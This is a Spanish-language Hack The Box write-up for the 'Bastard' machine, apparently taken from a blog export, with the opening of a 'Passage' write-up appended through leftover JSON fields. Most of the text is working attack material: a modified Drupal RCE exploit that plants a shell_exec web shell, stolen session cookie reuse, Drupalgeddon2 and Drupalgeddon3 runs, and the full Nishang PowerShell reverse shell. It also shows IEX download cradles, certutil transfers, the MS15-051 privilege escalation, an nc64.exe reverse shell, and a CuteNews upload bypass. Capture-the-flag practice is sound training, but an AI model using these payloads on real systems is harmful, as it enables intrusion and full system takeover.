GMTNmap scan report for 10. 10. 10. 9Host is up (0. 18s latency). PORT   STATE SERVICE VERSION80/tcp  open http  Microsoft IIS httpd 7. 5| http-robots. txt: 36 disallowed entries (15 shown)| /includes/ /misc/ /modules/ /profiles/ /scripts/ | /themes/ /CHANGELOG. txt /cron. php /INSTALL. mysql. txt | /INSTALL. pgsql. txt /INSTALL. sqlite. txt /install. php /INSTALL. txt |_/LICENSE. txt /MAINTAINERS. txt| http-methods: |_ Potentially risky methods: TRACE|_http-server-header: Microsoft-IIS/7. 5|_http-title: Welcome to Bastard | Bastard|_http-generator: Drupal 7 (http://drupal. org)135/tcp  open msrpc  Microsoft Windows RPC49154/tcp open msrpc  Microsoft Windows RPCService Info: OS: Windows; CPE: cpe:/o:microsoft:windowsService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 70. 71 secondsVisulizamos la versión de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   Microsoft IIS httpd 7. 5       135   MSRPC   Microsoft Windows RPC       49154   MSRPC   Microsoft Windows RPC   Explotación #: Primeramente ya que nmap nos reporto que el puerto 80 se encuentra abierto usaremos whatweb para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola. ❯ whatweb http://10. 10. 10. 9http://10. 10. 10. 9 [200 OK] Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[Microsoft-IIS/7. 5], IP[10. 10. 10. 9], JQuery, MetaGenerator[Drupal 7 (http://drupal. org)], Microsoft-IIS[7. 5], PHP[5. 3. 28,], PasswordField[pass], Script[text/javascript], Title[Welcome to Bastard | Bastard], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5. 3. 28, ASP. NET]La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a un Drupal 7, ademas vemos que esta desarrollado en PHP y ASP. NET  Drupal: Drupal es un sistema de gestión de contenidos o CMS libre, modular, multipropósito y muy configurable que permite publicar artículos, imágenes, archivos y que también ofrece la posibilidad de otros servicios añadidos como foros, encuestas, votaciones, blogs, administración de usuarios y permisos. Vamos a proceder a abrir el servicio web en el navegador Como concretamente vimos que la version de drupal que esta utilizando corresponde a la version 7, podemos tratar de buscar vulnerablidades asociadas a esta versión. Para ello usaremos searchsploit ❯ searchsploit drupal 7. x----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Drupal 7. x Module Services - Remote Code Execution                                                  | php/webapps/41564. phpDrupal &lt; 7. 34 - Denial of Service                                                          | php/dos/35415. txtDrupal &lt; 7. 58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                       | php/webapps/44557. rbDrupal &lt; 7. 58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                     | php/webapps/44542. txtDrupal &lt; 7. 58 / &lt; 8. 3. 9 / &lt; 8. 4. 6 / &lt; 8. 5. 1 - 'Drupalgeddon2' Remote Code Execution                                 | php/webapps/44449. rbDrupal &lt; 8. 3. 9 / &lt; 8. 4. 6 / &lt; 8. 5. 1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                               | php/remote/44482. rbDrupal &lt; 8. 3. 9 / &lt; 8. 4. 6 / &lt; 8. 5. 1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                   | php/webapps/44448. pyDrupal &lt; 8. 5. 11 / &lt; 8. 6. 10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                        | php/remote/46510. rbDrupal &lt; 8. 6. 10 / &lt; 8. 5. 11 - REST Module Remote Code Execution                                            | php/webapps/46452. txtDrupal &lt; 8. 6. 9 - REST Module Remote Code Execution                                                  | php/webapps/46459. pyDrupal avatar_uploader v7. x-1. 0-beta8 - Arbitrary File Disclosure                                          | php/webapps/44501. txtDrupal Module CKEditor &lt; 4. 1WYSIWYG (Drupal 6. x/7. x) - Persistent Cross-Site Scripting                                | php/webapps/25493. txtDrupal Module Coder &lt; 7. x-1. 3/7. x-2. 6 - Remote Code Execution                                            | php/remote/40144. phpDrupal Module RESTWS 7. x - PHP Remote Code Execution (Metasploit)                                          | php/remote/40130. rb----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsPodemos ver varias vulnerabilidades asociadas a la versión que corresponden a RCE (ejecucion remota de comandos). Usaremos el primer exploit que corresponde a uno en php, para ello vamos a proceder a traernoslo a nuestro directorio de trabajo. ❯ searchsploit -x php/webapps/41564. php❯ ls 41564. phpEste exploit aprovecha una inyeccion sql para obtener la cache del endpoint y credenciales de administrador en hash, para despues tratar de subir un archivo php. # Initializationerror_reporting(E_ALL);define('QID', 'anything');define('TYPE_PHP', 'application/vnd. php. serialized');define('TYPE_JSON', 'application/json');define('CONTROLLER', 'user');define('ACTION', 'login');$url = 'http://vmweb. lan/drupal-7. 54';$endpoint_path = '/rest_endpoint';$endpoint = 'rest_endpoint';$file = [  'filename' =&gt; 'dixuSOspsOUU. php',  'data' =&gt; '&lt;?php eval(file_get_contents(\'php://input\')); ?&gt;'];$browser = new Browser($url . $endpoint_path);Para utulizar el exploit, primero debemos cambiar ciertas variables que define el exploit como la url y el endpoint_path. En este caso debemos verificar si rest_endpoint existe.  Vemos que rest_endpoint no existe asi que podemos tratar usar un poco de guesing y probar la ruta rest.  Efectivamente vemos que se cambio la ruta por defecto a rest, claro que de no haber acertado de esta forma, podriamos realizar un ataque de fuerza bruta para descubrir esta ruta como una manera alterna de hacerlo. Pues viendo que esta ruta si es valida tbm lo modificaremos en el exploit. Finalmente vamos a modificar el archivo que crea por defecto, y vamos a crear uno propio. Este codigo nos permitira ejecutar comandos en la maquina victima mediante el parametro cmd a traves de la función shell_exec. &lt;?php  echo  &lt;pre&gt;  . shell_exec($_REQUEST['cmd']) .  &lt;/pre&gt; ;?&gt;El exploit procederia a quedarnos de la siguiente manera con los cambios realizados. # Initializationerror_reporting(E_ALL);define('QID', 'anything');define('TYPE_PHP', 'application/vnd. php. serialized');define('TYPE_JSON', 'application/json');define('CONTROLLER', 'user');define('ACTION', 'login');$url = 'http://10. 10. 10. 9';$endpoint_path = '/rest';$endpoint = 'rest_endpoint';$file = [  'filename' =&gt; 'pwn. php',  'data' =&gt; '&lt;?php echo  &lt;pre&gt;  . shell_exec($_REQUEST[\'cmd\']) .  &lt;/pre&gt; ; ?&gt;'];$browser = new Browser($url . $endpoint_path);Ahora procedemos a ejecutar el exploit. ❯ php drupal. php# Exploit Title: Drupal 7. x Services Module Remote Code Execution# Vendor Homepage: https://www. drupal. org/project/services# Exploit Author: Charles FOL# Contact: https://twitter. com/ambionics# Website: https://www. ambionics. io/blog/drupal-services-module-rce#!/usr/bin/phpStored session information in session. jsonStored user information in user. jsonCache contains 7 entriesFile written: http://10. 10. 10. 9/pwn. php❯ ls drupal. php  session. json  user. jsonVIsualizamos que el archivo nos lo sube en la ruta principal, lo siguiente sera validar el archivo subido.  Lo que ahora nos quedaria hacer, es enviarnos una revershell a nuestra maquina. De manera alternativa para ganar acceso vimos que antes, al ejecutar el exploit, nos creo un archivo session. json que contiene la sesion de usuario admin. {   session_name :  SESSd873f26fc11f2b7e6e4aa0f6fce59913 ,   session_id :  nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c ,   token :  F_Tzii9LQfqeF9ekHCP4qTIGp1VYlIU0fuG2LiIfwIA }Podemos cambiar nuestra cookie de sesión de manera simple con la opción inspeccionar, insertando el session_name en el campo nombre y el session_id en valor.  Una vez insertados los campos recargamos la pagina y ya estariamos logeados como el usuario admin.  Ahora que somos el ususario admin, podriamos dirigirnos a la opción Modules y activar la opción de PHP filter.  Despues agregamos un nuevo contenido en content.  Vamos a la opción articule y agregamos un nombre, en el cuerpo podemos ejecutar codigo php. En este caso usare un codigo reverse shell en windows. Puedes usar este codigo, solo necesitas cambiar la ip y puerto.  php_reverse_shell Establecemos en formato el de PHP code Nos en escucha por el puerto que configuramos en el codigo en mi caso en el puerto 443. Finalmente seleccionamos en la opción Preview.  Y habriamos ganado acceso como el usuario iis apppool\drupal. ❯ ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 9. Ncat: Connection from 10. 10. 10. 9:49279. SOCKET: Shell has connected! PID: 2644Microsoft Windows [Version 6. 1. 7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved. C:\inetpub\drupal-7. 54&gt;whoamiiis apppool\drupalC:\inetpub\drupal-7. 54&gt;Como segunda forma alternativa, podemos hacer uso del exploit drupalgeddon2. Podemos encontrar el exploit usando searchsploit. ❯ searchsploit drupalgeddon2----------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title                                                                    | Path----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Drupal &lt; 7. 58 / &lt; 8. 3. 9 / &lt; 8. 4. 6 / &lt; 8. 5. 1 - 'Drupalgeddon2' Remote Code Execution                                 | php/webapps/44449. rbDrupal &lt; 8. 3. 9 / &lt; 8. 4. 6 / &lt; 8. 5. 1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                               | php/remote/44482. rbDrupal &lt; 8. 3. 9 / &lt; 8. 4. 6 / &lt; 8. 5. 1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                   | php/webapps/44448. py----------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------Shellcodes: No ResultsPapers: No ResultsEsta hecho en ruby por lo que debemos tenerlo instalado para poder ejecutarlo. Lo que conseguiremos con este exploit es ganar acceso a la maquina victima mediante RCE. Como requisito lo mas probable es que te pida instalar la gema highline, lo cual se realiza del siguiente modo. ❯ gem install highlineFetching highline-2. 1. 0. gemSuccessfully installed highline-2. 1. 0Parsing documentation for highline-2. 1. 0Installing ri documentation for highline-2. 1. 0Done installing documentation for highline after 2 seconds1 gem installedUna vez instalada podemos ejecutar el exploit correctamente. ❯ ruby drupalgeddon. rbUsage: ruby drupalggedon2. rb &lt;target&gt; [--authentication] [--verbose]Example for target that does not require authentication:    ruby drupalgeddon2. rb https://example. comExample for target that does require authentication:    ruby drupalgeddon2. rb https://example. com --authenticationLo unico que le necesitamos proporcionar es el target en este caso la ip de la maquina victima. ❯ ruby drupalgeddon. rb http://10. 10. 10. 9[*] --==[::#Drupalggedon2::]==----------------------------------------------------------------------------------[i] Target : http://10. 10. 10. 9/La herramienta te automatiza el proceso para ganar acceso como el usuario nt authority\iusr [*] Dropping back to direct OS commandsdrupalgeddon2&gt;&gt; whoamint authority\iusrdrupalgeddon2&gt;&gt; ipconfigWindows IP ConfigurationEthernet adapter Local Area Connection:  Connection-specific DNS Suffix . :  IPv4 Address. . . . . . . . . . . : 10. 10. 10. 9  Subnet Mask . . . . . . . . . . . : 255. 255. 255. 0  Default Gateway . . . . . . . . . : 10. 10. 10. 2Tunnel adapter isatap. {56FEC108-3F71-4327-BF45-2B4EE355CD0F}:  Media State . . . . . . . . . . . : Media disconnected  Connection-specific DNS Suffix . : Tunnel adapter Local Area Connection* 9:  Media State . . . . . . . . . . . : Media disconnected  Connection-specific DNS Suffix . :Como tercera alternativa, tenemos el drupalgeddon3, del repositorio de:  https://github. com/oways/SA-CORE-2018-004Nos clonamos el respositorio y tenemos un script hecho el python3. ❯ git clone https://github. com/oways/SA-CORE-2018-004Clonando en 'SA-CORE-2018-004'. . . remote: Enumerating objects: 15, done. remote: Total 15 (delta 0), reused 0 (delta 0), pack-reused 15Recibiendo objetos: 100% (15/15), 106. 84 KiB | 475. 00 KiB/s, listo. Resolviendo deltas: 100% (2/2), listo. ❯ cd SA-CORE-2018-004❯ ls drupalgeddon3. py  example. png  README. md❯ python3 drupalgeddon3. py[Usage]python drupalgeddon3. py [URL] [Session] [Exist Node number] [Command][Example]python drupalgeddon3. py http://target/drupal/  SESS60c14852e77ed5de0e0f5e31d2b5f775=htbNioUD1Xt06yhexZh_FhL-h0k_BHWMVhvS6D7_DO0  6  uname -a Al ejecutarlo nos pide el target y la session que habriamos obtenido anteriormente con el primer exploit, seguidamente nos pide un nodo existente que lo podemos ver en la opción content &gt; find content y en REST haciendo hovering (pasar el mouse encima de la opción) vemos el numero de nodo y finalmente el comando que queremos ejecutar.  ❯ python3 drupalgeddon3. py http://10. 10. 10. 9  SESSd873f26fc11f2b7e6e4aa0f6fce59913=nERMEmBNPdBhSKZWnCye941RZL_zlBbAWPEuBs_0W2c  1  whoami nt authority\iusrEl exploit funciona correctamente y esta seria la tercera forma de ganar acceso al sistema. Para ganar al sistema de manera mas comoda usare el primer metodo, para usando la herramienta nishang y obtener acceso en una powershell.  Invoke-PowerShellTcp. ps1Para matar dos pajaros de un tiro, como es de costumbre añadiremos al final del script la ejecución del comando que nos otorgue la conexión una vez este se interprete. function Invoke-PowerShellTcp {   [CmdletBinding(DefaultParameterSetName= reverse )] Param(    [Parameter(Position = 0, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 0, Mandatory = $false, ParameterSetName= bind )]    [String]    $IPAddress,    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= reverse )]    [Parameter(Position = 1, Mandatory = $true, ParameterSetName= bind )]    [Int]    $Port,    [Parameter(ParameterSetName= reverse )]    [Switch]    $Reverse,    [Parameter(ParameterSetName= bind )]    [Switch]    $Bind  )    try   {    #Connect back if the reverse switch is used.     if ($Reverse)    {      $client = New-Object System. Net. Sockets. TCPClient($IPAddress,$Port)    }    #Bind to the provided port if Bind switch is used.     if ($Bind)    {      $listener = [System. Net. Sockets. TcpListener]$Port      $listener. start()        $client = $listener. AcceptTcpClient()    }     $stream = $client. GetStream()    [byte[]]$bytes = 0. . 65535|%{0}    #Send back current username and computername    $sendbytes = ([text. encoding]::ASCII). GetBytes( Windows PowerShell running as user   + $env:username +   on   + $env:computername +  `nCopyright (C) 2015 Microsoft Corporation. All rights reserved. `n`n )    $stream. Write($sendbytes,0,$sendbytes. Length)    #Show an interactive PowerShell prompt    $sendbytes = ([text. encoding]::ASCII). GetBytes('PS ' + (Get-Location). Path + '&gt;')    $stream. Write($sendbytes,0,$sendbytes. Length)    while(($i = $stream. Read($bytes, 0, $bytes. Length)) -ne 0)    {      $EncodedText = New-Object -TypeName System. Text. ASCIIEncoding      $data = $EncodedText. GetString($bytes,0, $i)      try      {        #Execute the command on the target.         $sendback = (Invoke-Expression -Command $data 2&gt;&amp;1 | Out-String )      }      catch      {        Write-Warning  Something went wrong with execution of command on the target.           Write-Error $_      }      $sendback2 = $sendback + 'PS ' + (Get-Location). Path + '&gt; '      $x = ($error[0] | Out-String)      $error. clear()      $sendback2 = $sendback2 + $x      #Return the results      $sendbyte = ([text. encoding]::ASCII). GetBytes($sendback2)      $stream. Write($sendbyte,0,$sendbyte. Length)      $stream. Flush()     }    $client. Close()    if ($listener)    {      $listener. Stop()    }  }  catch  {    Write-Warning  Something went wrong! Check if the server is reachable and you are using the correct port.       Write-Error $_  }}Invoke-PowerShellTcp -Reverse -IPAddress 10. 10. 16. 3 -Port 443Nos compartimos ahora un servicio web con python y nos ponemos en escucha por el puerto 443. ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . Ejecutamos el script mediante el archivo pwn. php que subimos previamente y elecutamos Invoke-PowerShellTcp. ps1 con IEX para que se nos interprete.  Recibimos la petición ❯ python3 -m http. server 80Serving HTTP on 0. 0. 0. 0 port 80 (http://0. 0. 0. 0:80/) . . . 10. 10. 10. 9 - - [29/Apr/2023 03:34:16]  GET /Invoke-PowerShellTcp. ps1 HTTP/1. 1  200 -y ganamos acceso en una powershell. ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 9. Ncat: Connection from 10. 10. 10. 9:49349. Windows PowerShell running as user BASTARD$ on BASTARDCopyright (C) 2015 Microsoft Corporation. All rights reserved. PS C:\inetpub\drupal-7. 54&gt;Nos dirigimos al directorio del usuario dimitris y visiualizamos la primera flag user. txt. cd Desktopdir  Directory: C:\Users\dimitris\DesktopMode        LastWriteTime   Length Name               ----        -------------   ------ ----               -a---     19/3/2017  8:06 ??     32 user. txt             type user. txtba22fde1932d06eb76a163d312f921a2PS C:\Users\dimitris\Desktop&gt;Logramos obtener unas contraseñas en texto claro. Escalada de Privilegios #: Usaremos sherlock. ps1 para detectar vias potenciales de escalar privilegios en el kernel. esta herramienta realiza un proceso similar a herramientas como powerview y winpeas.  Sherlock. ps1Una vez tengamos el script si filtramos por function. podemos ver distintas opciones que podemos probar. ❯ cat Sherlock. ps1 | grep  function function Get-FileVersionInfo ($FilePath) {function Get-InstalledSoftware($SoftwareName) {function Get-Architecture {function Get-CPUCoreCount {function New-ExploitTable {function Set-ExploitTable ($MSBulletin, $VulnStatus) {function Get-Results {function Find-AllVulns {function Find-MS10015 {function Find-MS10092 {function Find-MS13053 {function Find-MS13081 {function Find-MS14058 {function Find-MS15051 {function Find-MS15078 {function Find-MS16016 {function Find-MS16032 {function Find-MS16034 {function Find-CVE20177199 {function Find-MS16135 {Usaremos la opción Find-AllVulns que me probara todas las opciones. Para ello debemos abrirnos el script y en la linea final agregar Find-AllVulns, que hara que al interpretarse el codigo al final llame a esa función.     $Build = [int]$VersionInfo[2]    $Revision = [int]$VersionInfo[3]. Split(   )[0]    switch ( $Build ) {      7601 { $VulnStatus = @( Not Vulnerable , Appears Vulnerable )[ $Revision -lt 23584 ] }      9600 { $VulnStatus = @( Not Vulnerable , Appears Vulnerable )[ $Revision -le 18524 ] }      10240 { $VulnStatus = @( Not Vulnerable , Appears Vulnerable )[ $Revision -le 16384 ] }      10586 { $VulnStatus = @( Not Vulnerable , Appears Vulnerable )[ $Revision -le 19 ] }      14393 { $VulnStatus = @( Not Vulnerable , Appears Vulnerable )[ $Revision -le 446 ] }      default { $VulnStatus =  Not Vulnerable  }    }  Set-ExploitTable $MSBulletin $VulnStatus}Find-AllVulnsCompartimos un servicio web con python nuevamente y interpretamos el script desde la maquina victima con IEX. Iex(New-Object Net. WebClient). downloadString('http://10. 10. 16. 3/Sherlock. ps1')Title   : User Mode to Ring (KiTrap0D)MSBulletin : MS10-015CVEID   : 2010-0232Link    : https://www. exploit-db. com/exploits/11199/VulnStatus : Not supported on 64-bit systemsTitle   : Task Scheduler . XMLMSBulletin : MS10-092CVEID   : 2010-3338, 2010-3888Link    : https://www. exploit-db. com/exploits/19930/VulnStatus : Appears VulnerableTitle   : NTUserMessageCall Win32k Kernel Pool OverflowMSBulletin : MS13-053CVEID   : 2013-1300Link    : https://www. exploit-db. com/exploits/33213/VulnStatus : Not supported on 64-bit systemsTitle   : TrackPopupMenuEx Win32k NULL PageMSBulletin : MS13-081CVEID   : 2013-3881Link    : https://www. exploit-db. com/exploits/31576/VulnStatus : Not supported on 64-bit systemsTitle   : TrackPopupMenu Win32k Null Pointer DereferenceMSBulletin : MS14-058CVEID   : 2014-4113Link    : https://www. exploit-db. com/exploits/35101/VulnStatus : Not VulnerableTitle   : ClientCopyImage Win32kMSBulletin : MS15-051CVEID   : 2015-1701, 2015-2433Link    : https://www. exploit-db. com/exploits/37367/VulnStatus : Appears VulnerableTitle   : Font Driver Buffer OverflowMSBulletin : MS15-078CVEID   : 2015-2426, 2015-2433Link    : https://www. exploit-db. com/exploits/38222/VulnStatus : Not VulnerableTitle   : 'mrxdav. sys' WebDAVMSBulletin : MS16-016CVEID   : 2016-0051Link    : https://www. exploit-db. com/exploits/40085/VulnStatus : Not supported on 64-bit systemsTitle   : Secondary Logon HandleMSBulletin : MS16-032CVEID   : 2016-0099Link    : https://www. exploit-db. com/exploits/39719/VulnStatus : Appears VulnerableVemos que parece ser vulnerable a MS15-051 y para explotarlo usaremos un repositorio en github, del cual podemos descargarnos un archivo zip que contiene el ejecutable.  https://github. com/SecWiki/windows-kernel-exploits/tree/master/MS15-051❯ ls Source  ms15-051. exe  ms15-051x64. exeProcedemos a subirlo a la maquina victima, para ello usaremos certutil. certutil. exe -f -urlcache -split http://10. 10. 16. 3/ms15-051x64. exe ms15-051x64. exe**** Online **** 0000 . . .  d800CertUtil: -URLCache command completed successfully. dir  Directory: C:\WIndows\Temp\PrivMode        LastWriteTime   Length Name               ----        -------------   ------ ----               -a---     29/4/2023  7:04 ??   55296 ms15-051x64. exePara ejecutarlo, simplemte debemos pasarle un comando. . \ms15-051x64. exe  whoami [#] ms15-051 fixed by zcgonvh[!] process with pid: 1760 created. ==============================nt authority\systemPS C:\WIndows\Temp\Priv&gt; Seguidamente para ganar acceso como administrator, descargaremos ncat versión 1. 12  https://eternallybored. org/misc/netcat/Una vez lo tengamos, proceremos a subir nc64. exe a la maquina victima. ❯ ls doexec. c  generic. h  getopt. c  getopt. h  hobbit. txt  license. txt  Makefile  nc. exe  nc64. exe  netcat. c  readme. txtcertutil. exe -f -urlcache -split http://10. 10. 16. 3/nc64. exe nc64. exe**** Online **** 0000 . . .  b0d8CertUtil: -URLCache command completed successfully. Una vez subido el ejecutable, vamos a ejecutarlo de manera privilegiada usando el exploit y asi obtener una consola interactiva.   Directory: C:\Windows\Temp\PrivMode        LastWriteTime   Length Name               ----        -------------   ------ ----               -a---     29/4/2023  7:04 ??   55296 ms15-051x64. exe          -a---     29/4/2023  7:15 ??   45272 nc64. exe             . \ms15-051x64. exe  C:\Windows\Temp\Priv\nc64. exe -e cmd 10. 10. 16. 3 443 Ejecutamos y recibimos la conexión como nt authority\system. ❯ rlwrap ncat -nlvp 443Ncat: Version 7. 92 ( https://nmap. org/ncat )Ncat: Listening on :::443Ncat: Listening on 0. 0. 0. 0:443Ncat: Connection from 10. 10. 10. 9. Ncat: Connection from 10. 10. 10. 9:49361. Microsoft Windows [Version 6. 1. 7600]Copyright (c) 2009 Microsoft Corporation.  All rights reserved. whoamiwhoamint authority\systemC:\Windows\Temp\Priv&gt;Finalmente nos dirigimos al directorio personal del usuario administrator y visualizamos la segunda flag root. txt 😏. dir Volume in drive C has no label. Volume Serial Number is C4CD-C60B Directory of C:\Users\Administrator\Desktop08/02/2022 05:50   &lt;DIR&gt;     . 08/02/2022 05:50   &lt;DIR&gt;     . . 19/03/2017 08:34         32 root. txt        1 File(s)       32 bytes        2 Dir(s)  4. 134. 981. 632 bytes freetype root. txttype root. txt4bf12b963da1b30cc93496f617f7ba7c"
    }, {
    "id": 36,
    "url": "http://localhost:4000/hackthebox/htb-writeup-Passage",
    "title": "Maquina Passage - htb writeup",
    "body": "2023/04/17 - El dia de hoy vamos a estar resolviendo la maquina Passage de hackthebox que es una maquina Linux de dificultad Media. Para explotar esta maquina abusaremos una vulnerabilidad de Cute News con la que obtendremos ejecución remota de comandos, despues haremos un analisis de codigo de un repositorio publico en github para descubrir ciertos recursos y finalmente para escalar privilegios como el usuario root nos aprovecharemos de USBCreator Vamos a comenzar como de costrumbre creando un directorio con el nombre de la maquina: ❯ mkdir Passage❯ ls Passage❯ which mktmkt () {	mkdir {nmap,content,scripts}}❯ mkt❯ ls content  exploits  nmapEnumeración #: Ahora que tenemos nuestros directorios proseguimos con la fase de Enumeración, empezamos mandando una traza a la ip de la maquina victima con el comando ping: ❯ ping -c 1 10. 10. 10. 206PING 10. 10. 10. 206 (10. 10. 10. 206) 56(84) bytes of data. 64 bytes from 10. 10. 10. 206: icmp_seq=1 ttl=63 time=210 ms--- 10. 10. 10. 206 ping statistics ---1 packets transmitted, 1 received, 0% packet loss, time 0msrtt min/avg/max/mdev = 210. 072/210. 072/210. 072/0. 000 msVemos que la maquina nos responde con un ttl de 63 correspondiente a una maquina linux, ahora procederemoscon el escaneo de puertos con la ayuda de nmap: Escaneo de Puertos:       Parámetro   Descripción         -p-   Escaneamos todos los 65535 puertos.        –open   Solo los puertos que estén abiertos.        -v   Permite ver en consola lo que va encontrando (verbose).        -oG   Guarda el output en un archivo con formato grepeable para que mediante una funcion de S4vitar nos va a permitir extraer cada uno de los puertos y copiarlos sin importar la cantidad en la clipboard y asi al hacer ctrl_c esten disponibles   Procedemos a escanear los puertos abiertos y lo exportaremos al archivo de nombre openPorts: ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10. 10. 10. 206 -oG openPortsHost discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower. Starting Nmap 7. 92 ( https://nmap. org ) at 2023-04-17 16:25 GMTInitiating SYN Stealth Scan at 16:25Scanning 10. 10. 10. 206 [65535 ports]Discovered open port 22/tcp on 10. 10. 10. 206Discovered open port 80/tcp on 10. 10. 10. 206Completed SYN Stealth Scan at 16:25, 16. 83s elapsed (65535 total ports)Nmap scan report for 10. 10. 10. 206Host is up, received user-set (0. 12s latency). Scanned at 2023-04-17 16:25:13 GMT for 17sNot shown: 65533 closed tcp ports (reset)PORT  STATE SERVICE REASON22/tcp open ssh   syn-ack ttl 6380/tcp open http  syn-ack ttl 63Read data files from: /usr/bin/. . /share/nmapNmap done: 1 IP address (1 host up) scanned in 17. 00 seconds      Raw packets sent: 82801 (3. 643MB) | Rcvd: 82648 (3. 306MB)Despues de realizarse el escaneo vemos que los puertos abiertos corresponden a 22 ssh , 80 http. Escaneo de Version y Servicios. : ❯ nmap -sCV -p22,80 10. 10. 10. 206 -oN targetedStarting Nmap 7. 92 ( https://nmap. org ) at 2023-04-17 16:27 GMTNmap scan report for 10. 10. 10. 206Host is up (0. 20s latency). PORT  STATE SERVICE VERSION22/tcp open ssh   OpenSSH 7. 2p2 Ubuntu 4 (Ubuntu Linux; protocol 2. 0)| ssh-hostkey: |  2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)|  256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)|_ 256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)80/tcp open http  Apache httpd 2. 4. 18 ((Ubuntu))|_http-title: Passage News|_http-server-header: Apache/2. 4. 18 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap. org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20. 80 secondsVisulizamos la versión de los puertos escaneados:       Puerto   Servicio   Versión         22   SSH   OpenSSH 7. 2p2       80   HTTP   Apache httpd 2. 4. 18   Explotación #: Primeramente ya que nmap nos reporto que el puerto 80 se encuentra abiertos usaremos whatweb para tratar identificar a que nos estamos enfrentando y ver el gestor de contenido web desde consola. ❯ whatweb http://10. 10. 10. 206http://10. 10. 10. 206 [200 OK] Apache[2. 4. 18], Bootstrap, Cookies[CUTENEWS_SESSION], Country[RESERVED][ZZ], Email[kim@example. com,nadav@passage. htb,paul@passage. htb,sid@example. com], HTTPServer[Ubuntu Linux][Apache/2. 4. 18 (Ubuntu)], IP[10. 10. 10. 206], JQuery, PoweredBy[CuteNews:], Script[text/javascript], Title[Passage News] Cutenews: CuteNews es un gestor de noticias/sistema de publicación blog, creado por el equipo de desarrolladores de CutePHP La herramienta nos reporta que se esta usando el gestor de contenido correspondiente a Cutenews, ademas vemos que se puede estar aplicando virtual hosting. Por lo que procederemos a agregar el dominio a nuestro /etc/hosts ❯ echo  10. 10. 10. 206 passage. htb  &gt;&gt; /etc/hostsVamos a proceder a abrir el servicio web en el navegador A primera vista no vemos algo muy relevante asi que probaremos a ver el codigo fuente de la pagina.  Visualizamos que existe una ruta de nombre CuteNews y tenemos capacidad de acceso a la ruta que concretamente se trata de un panel de login.  Encontramos algo muy interesante en el panel de login ya que podemos ver la versión de CuteNews que se esta utilizando. Verificamos si hay algun exploit publico searchsploit y efectivamente existen vulnerabilidades asociadas a esta versión especifica 2. 1. 2 ❯ searchsploit cutenews 2. 1. 2------------------------------------------------------------------------------------------------------------------------------------------------------------------ Exploit Title                                                             | Path------------------------------------------------------------------------------------------------------------------------------------------------------------------CuteNews 2. 1. 2 - 'avatar' Remote Code Execution (Metasploit)                                      | php/remote/46698. rbCuteNews 2. 1. 2 - Arbitrary File Deletion                                                | php/webapps/48447. txtCuteNews 2. 1. 2 - Authenticated Arbitrary File Upload                                          | php/webapps/48458. txtCuteNews 2. 1. 2 - Remote Code Execution                                                 | php/webapps/48800. py------------------------------------------------------------------------------------------------------------------------------------------------------------------Shellcodes: No ResultsPapers: No ResultsTenemos exploits que corresponden a RCE, el primero de ellos nos habla de algo asociado con avatar, podemos investigar de que trata el exploit trayendonoslo a nuestro directorio. Pero primero recordemos que en el panel de login, existia la opción de registrar un nuevo usuario. Procedamos a registrarnos en el servicio.  Una vez registrados, obervamos en nuestro panel un campo correspondiente a avatar, y si recordamos antes vimos un exploit asociado que justamente nos hablaba de algo de avatar. Quiero pensar entonces que al este campo corrsponder a una subida de archivos, entonces la RCE en el exploit la obtiene de un mal control en la subida de archivos.  Para estar seguros podemos examinar el exploit y ver que que trata. Efectivamente dentro encontramos una función que lo que hace es realizar una petición en avatar subiendo un arhivo php que incluye una cabecera GIF y de Content-Type image/png: esto para mediante el uso de Magic Numbers hacer un bypass aprovechando la mala sanitización en el campo de subida y este nos detecte el archivo como un GIF. def upload_shell(cookie, check)  res = send_request_cgi({   'method'  =&gt; 'GET',   'uri'   =&gt; normalize_uri(target_uri. path,  index. php?mod=main&amp;opt=personal ),   'cookie'  =&gt; cookie  })  signkey = res. body. split('__signature_key  value= ')[1]. split(' ')[0]  signdsi = res. body. split('__signature_dsi  value= ')[1]. split(' ')[0]  # data preparation  fname = Rex::Text. rand_text_alpha_lower(8) +  . php   @shell =  #{fname}   pdata = Rex::MIME::Message. new  pdata. add_part('main', 